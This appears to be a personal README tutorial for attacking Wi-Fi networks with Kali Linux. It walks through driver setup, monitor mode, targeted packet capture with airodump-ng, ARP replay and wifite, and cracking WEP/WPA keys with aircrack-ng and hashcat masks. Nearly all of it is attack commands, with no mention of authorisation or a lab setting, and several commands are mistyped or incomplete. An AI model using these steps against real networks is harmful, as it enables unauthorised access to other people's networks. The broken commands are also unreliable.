# Wifi_attack


tools that I used : ALFA AC1200 AWUS036ACH

## First Step : install driver on Kali Linux

```
apt-get update
apt-get upgrade -y
apt-get dist-upgrade -y
apt-get install dkms`
apt-get install realtek-rtl88xxau-dkms
git clone https://github.com/aircrack-ng/rtl8812au.git`
cd rtl8812au   
make  
make install
```

lastly, you need to reboot your Kali Linux

## Second Step : Discovering Networks

Prior to looking for networks, you must put your wireless card into what is called "monitor mode". Monitor mode is a special mode that allows your computer to listen to every wireless packet. This monitor mode also allows you to optionally inject packets into a network.

To put your wireless card into monitor mode using airmon-ng:

`airmon-ng start wlan0`

To confirm it is in monitor mode, run "iwconfig" and confirm the mode.

Then, start airodump-ng to look out for networks:

`airodump-ng wlan0`

if airodump-ng could connect to the WLAN device, you'll see a screen like this:

https://www.aircrack-ng.org/lib/exe/fetch.php?tok=1b417c&media=https%3A%2F%2Fwww.aircrack-ng.org%2Fimg%2Fnewbie_airodump.png

The current channel is shown in the top left corner.

After a short time some APs and (hopefully) some associated clients will show up.

The upper data block shows the access points found:

BSSID The MAC address of the AP
RXQ Quality of the signal, when locked on a channel
PWR Signal strength. Some drivers don't report it
Beacons Number of beacon frames received. If you don't have a signal strength you can estimate it by the number of beacons, the better the signal quality
Data : Number of data frames received 
CH : Channel the AP is operating on
MB : Speed or AP Mode. 11 is pure 802.11b, 54 pure 802.11g
ENC : Encryption 
ESSID : the network name. Sometimes hidden

the lower data block shows the clients found:

BSSID : The MAC of the AP this client is associated to 
STATION : The MAC of the client itself  
PWR : Signal strenght. Some driver don't report it
Packets : Number of data frames received
Probes: Network names (ESSIDs) this client has probed

## Third Step : Sniffing

Because of the channel hopping you won't capture all packets from your target net. So we want to listen just one channel and additionally write all data to disk to be able to use it for cracking:

`airodum-ng -c 11 --bssid 00:01:02:03:04:05 -w dump wlan0`

With the -c parameter you tune to a channel and the parameter after -w is the prefix to the network dumps written to disk. The "--bssid" combined with the AP MAC address limites the capture to the one AP. 

## ARP replay

First open a window with an airodump-ng sniffing for traffic. aireplay-ng and airodump-ng can run together. Wait for a client to show up on the target network. Then start the attack:

```
aireplay-ng --arp

sudo wifite --no-pmkid

sudo airodump-ng --band abg wlan0

```



## Cracking 

if you've got enough IVs captured in one or more file, you can try to crack the WEP key:

`aircrack-ng -w /usr/share/wordlists/rockyou.txt dump-01.cap`


## HashCat 


```
sudo apt install hcxtools

hcxpcapngtool -o hashcat_format dump-01.cap

```
transfer the hashcat_format to your machine (create a shared directory)

install the hashcat.exe

we have received a hashcat netmask ?u?d?l?l?u?l?s?s

on powershell : `.\hashcat.exe -m 22000 -a 3 . . \hashes\hashcat_format ?u?d?l?l?u?l?s?s  . . \hashes\optimized.txt `
